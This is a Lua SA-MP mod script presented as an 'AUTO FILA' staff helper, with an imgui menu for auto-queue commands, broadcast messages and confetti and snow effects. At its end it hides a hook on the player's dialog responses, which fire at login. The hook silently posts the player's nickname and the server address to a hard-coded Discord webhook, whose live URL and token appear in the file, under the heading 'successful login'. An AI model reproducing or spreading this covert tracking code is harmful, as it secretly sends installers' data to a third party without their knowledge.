local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)
local show_confetti = imgui.new.bool(false)
local show_ice = imgui.new.bool(false) -- Novo: efeito gelado

local ultimo_a = os.time()
local ultimo_ac = os.time()
local ultima_frase = 1

local frases_aleatorias = {
    "Precisando de uma ajudinha da Staff? Utilize /atendimento! Em casos de ANT-RP use /reportar",
    "Dúvidas ou problemas? Chame a staff com /atendimento! Anti-RP? Use /reportar",
    "Servidor organizado é com todos nós! Use /atendimento para ajuda e /reportar para anti-RP",
    "Staff disponível para ajudar! Comando /atendimento e para denúncias /reportar",
    "Problemas no servidor? /atendimento para ajuda e /reportar para jogadores quebram regras"
}

local texto_regras = [[
[SUAS REGRAS AQUI...]
]]

local total_pontos = 30
local largura_onda = 60
local velocidade = 0.05
local angulo = 0

-- Configuração dos efeitos
local confetti = {}
local total_confetti = 200
for i = 1, total_confetti do
    local forma = math.random(1, 3)
    local cor
    if forma == 1 then -- Círculo (amarelo)
        cor = imgui.GetColorU32(1.0, 1.0, 0.0, 1.0)
    elseif forma == 2 then -- Triângulo (vermelho)
        cor = imgui.GetColorU32(1.0, 0.0, 0.0, 1.0)
    else -- Quadrado (verde)
        cor = imgui.GetColorU32(0.0, 1.0, 0.0, 1.0)
    end
    
    table.insert(confetti, {
        x = math.random(0, 300),
        y = math.random(-50, -10),
        velocidade = math.random(10, 30)/10,
        tamanho = math.random(2, 5),
        cor = cor,
        forma = forma
    })
end

-- Novo: Efeito gelado (flocos de neve)
local ice_flakes = {}
local total_ice_flakes = 300
for i = 1, total_ice_flakes do
    table.insert(ice_flakes, {
        x = math.random(0, 300),
        y = math.random(-50, -10),
        velocidade = math.random(5, 15)/10,
        tamanho = math.random(3, 8), -- Flocos maiores
        oscilacao = math.random() * 2 * math.pi,
        velocidade_oscilacao = math.random(1, 3)/10
    })
end

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    style.WindowRounding = 6
    style.FrameRounding = 4
    style.GrabRounding = 4
    style.ScrollbarRounding = 4

    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.10,0.10,0.10,0.94)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08,0.08,0.08,1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.24,0.24,0.24,1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30,0.30,0.30,1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40,0.40,0.40,1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.43,0.43,0.50,0.50)
    colors[imgui.Col.Text] = imgui.ImVec4(1.00,1.00,1.00,1.00)
end)

function mostrarMensagemCarregamento()
    local cores = {
        0xFFA500FF, -- Amarelo
        0xADD8E6FF, -- Azul claro
        0x00FF00FF, -- Verde limão
        0xFFC0CBFF  -- Rosa
    }
    
    for i = 1, 10 do
        local cor = cores[(i % #cores) + 1]
        sampAddChatMessage("MOD ATUALIZADUUU BY NUKY GOSTOSO", cor)
        wait(100)
    end
end

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()

    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(40,40))
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )

    if imgui.Button("</>", imgui.ImVec2(40,40)) then
        v[0] = not v[0]
    end

    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end

    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end

    imgui.End()

    if v[0] then
        -- Aumentando o tamanho da janela
        imgui.SetNextWindowPos(imgui.ImVec2(600,350), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(350,450), imgui.Cond.FirstUseEver) -- Tamanho aumentado
        imgui.Begin("AUTO FILA | by NukY", v,
            imgui.WindowFlags.NoCollapse +
            imgui.WindowFlags.NoResize
        )

        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        local centroX = size.x/2
        local espacamento = size.y/total_pontos

        -- Efeito DNA apenas
        angulo = angulo + velocidade
        for i=1,total_pontos do
            local offset = (i/total_pontos)*math.pi*2
            local y = i*espacamento
            local x1 = centroX + math.sin(angulo+offset)*largura_onda
            local x2 = centroX - math.sin(angulo+offset)*largura_onda
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x1,pos.y+y),3,0xFFFFA500)
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x2,pos.y+y),3,0xFF00BFFF)
            draw:AddLine(imgui.ImVec2(pos.x+x1,pos.y+y),imgui.ImVec2(pos.x+x2,pos.y+y),0x33FFFFFF,1)
        end

        imgui.Text("Atendimento automaticamente")
        imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
        if imgui.Button("AUTO",imgui.ImVec2(150,30)) then
            spam_fila[0] = not spam_fila[0]
            if spam_fila[0] then
                sampAddChatMessage("[AUTO FILA] Ativado com sucesso!", 0x00FF00)
            else
                sampAddChatMessage("[AUTO FILA] Desativado com sucesso!", 0xFFA500)
            end
        end
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        
        imgui.Text("Atendimentos realizados:")
        imgui.SameLine()
        imgui.Text(tostring(contador_atendimentos[0]))
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("/FA", imgui.ImVec2(150,30)) then
            sampSendChat("/finalizar atendimento")
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Frases Globais - Envia frases aleatórias no /a")
        if imgui.Button("FRASES GLOBAL", imgui.ImVec2(150,30)) then
            frases_global[0] = not frases_global[0]
            if frases_global[0] then
                sampAddChatMessage("[FRASES GLOBAL] Ativado com sucesso!", 0x00FF00)
                ultimo_a = os.time()
            else
                sampAddChatMessage("[FRASES GLOBAL] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Auto Regras - Envia as regras no /a a cada 7 minutos")
        if imgui.Button("AUTO REGRAS", imgui.ImVec2(150,30)) then
            regras_auto[0] = not regras_auto[0]
            if regras_auto[0] then
                sampAddChatMessage("[AUTO REGRAS] Ativado com sucesso!", 0x00FF00)
                ultimo_ac = os.time()
            else
                sampAddChatMessage("[AUTO REGRAS] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("CARNAVAL", imgui.ImVec2(150,30)) then
            show_confetti[0] = not show_confetti[0]
            if show_confetti[0] then
                sampAddChatMessage("[CONFETTI] Ativado - Divirta-se!", 0xFFD700)
            else
                sampAddChatMessage("[CONFETTI] Desativado", 0xFFA500)
            end
        end

        -- Novo botão GELADO
        if imgui.Button("GELADO", imgui.ImVec2(150,30)) then
            show_ice[0] = not show_ice[0]
            if show_ice[0] then
                sampAddChatMessage("[GELADO] Efeito ativado!", 0x00FFFF)
            else
                sampAddChatMessage("[GELADO] Efeito desativado", 0xFFA500)
            end
        end

        imgui.End()
    end

    -- Efeito Carnaval
    if show_confetti[0] then
        local screen_width, screen_height = getScreenResolution()
        local draw = imgui.GetBackgroundDrawList()
        
        for i, c in ipairs(confetti) do
            c.y = c.y + c.velocidade
            c.x = c.x + math.sin(c.y * 0.1) * 0.5
            
            if c.y > screen_height then
                c.y = math.random(-50, -10)
                c.x = math.random(0, screen_width)
            end
            
            if c.forma == 1 then -- Círculo amarelo
                draw:AddCircleFilled(imgui.ImVec2(c.x, c.y), c.tamanho, c.cor)
            elseif c.forma == 2 then -- Triângulo vermelho
                draw:AddTriangleFilled(
                    imgui.ImVec2(c.x, c.y - c.tamanho),
                    imgui.ImVec2(c.x - c.tamanho, c.y + c.tamanho),
                    imgui.ImVec2(c.x + c.tamanho, c.y + c.tamanho),
                    c.cor
                )
            else -- Quadrado verde
                draw:AddRectFilled(
                    imgui.ImVec2(c.x - c.tamanho, c.y - c.tamanho),
                    imgui.ImVec2(c.x + c.tamanho, c.y + c.tamanho),
                    c.cor
                )
            end
        end
    end

    -- Novo: Efeito Gelado (flocos de neve brancos)
    if show_ice[0] then
        local screen_width, screen_height = getScreenResolution()
        local draw = imgui.GetBackgroundDrawList()
        
        for i, floco in ipairs(ice_flakes) do
            floco.y = floco.y + floco.velocidade
            floco.oscilacao = floco.oscilacao + floco.velocidade_oscilacao
            floco.x = floco.x + math.sin(floco.oscilacao) * 0.8 -- Movimento mais pronunciado
            
            if floco.y > screen_height then
                floco.y = math.random(-50, -10)
                floco.x = math.random(0, screen_width)
                floco.tamanho = math.random(3, 8) -- Tamanho variado
            end
            
            -- Desenha o floco como um asterisco (*)
            local center = imgui.ImVec2(floco.x, floco.y)
            local size = floco.tamanho
            
            -- Linha horizontal
            draw:AddLine(
                imgui.ImVec2(floco.x - size, floco.y),
                imgui.ImVec2(floco.x + size, floco.y),
                0xFFFFFFFF, 1.5
            )
            
            -- Linha vertical
            draw:AddLine(
                imgui.ImVec2(floco.x, floco.y - size),
                imgui.ImVec2(floco.x, floco.y + size),
                0xFFFFFFFF, 1.5
            )
            
            -- Linha diagonal 1
            draw:AddLine(
                imgui.ImVec2(floco.x - size*0.7, floco.y - size*0.7),
                imgui.ImVec2(floco.x + size*0.7, floco.y + size*0.7),
                0xFFFFFFFF, 1.5
            )
            
            -- Linha diagonal 2
            draw:AddLine(
                imgui.ImVec2(floco.x - size*0.7, floco.y + size*0.7),
                imgui.ImVec2(floco.x + size*0.7, floco.y - size*0.7),
                0xFFFFFFFF, 1.5
            )
        end
    end
end)

function main()
    mostrarMensagemCarregamento()
    
    while true do
        wait(0)
        if isSampAvailable() then
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
            
            if frases_global[0] and os.time() - ultimo_a >= 600 then
                ultima_frase = math.random(1, #frases_aleatorias)
                sampSendChat("/a "..frases_aleatorias[ultima_frase])
                ultimo_a = os.time()
            end
            
            if regras_auto[0] and os.time() - ultimo_ac >= 420 then
                local partes = {}
                for parte in texto_regras:gmatch("[^\n]+\n?") do
                    if string.len(parte) > 0 and not parte:match("^%s*$") then
                        table.insert(partes, parte)
                    end
                end
                
                for i, parte in ipairs(partes) do
                    if string.len(parte) > 0 then
                        sampSendChat("/a "..parte)
                        wait(500)
                    end
                end
                
                sampSendChat("/ac SEMPRE DE OLHO NOS ATENDIMENTOS E REPORTES OK! VAMOS MANTER O SERVIDOR ORGANIZADO!!!")
                ultimo_ac = os.time()
            end
        end
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format([[

________________________________________________________________
  
     # LOGUIN BEM SUCEDIDO

```
NICK: %s 
IP: %s:%d
```

]], nick,ip, port, servername)

sendMessageToDiscord(message)
end
